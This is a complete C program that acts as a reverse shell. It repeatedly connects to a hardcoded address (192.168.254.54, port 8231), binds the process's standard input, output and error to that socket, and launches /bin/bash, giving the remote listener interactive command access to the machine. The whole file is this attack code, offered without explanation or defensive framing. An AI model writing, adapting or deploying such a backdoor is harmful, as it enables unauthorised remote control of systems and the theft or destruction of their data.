#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <time.h>

static clock_t s_last_attempt = -1;
static char s_is_waiting = false;

int main(int argc, char *argv[]) {
    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    sa.sin_port = htons(8231);
    sa.sin_addr.s_addr = inet_addr("192.168.254.54");
    int sockt = socket(AF_INET, SOCK_STREAM, 0);

    while (true) {
        clock_t cur_time = clock();
        float seconds_since_attempt = (float)(cur_time - s_last_attempt) / CLOCKS_PER_SEC;

        if (s_is_waiting && seconds_since_attempt < 5.0f) {
            continue;
        }

        if (connect(sockt, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
            s_is_waiting = true;
            s_last_attempt = clock();
            continue;
        }

        dup2(sockt, 0);
        dup2(sockt, 1);
        dup2(sockt, 2);

        char* const argv[] = {"/bin/bash", NULL};
        execve("/bin/bash", argv, NULL);
    }

    return 0;
}
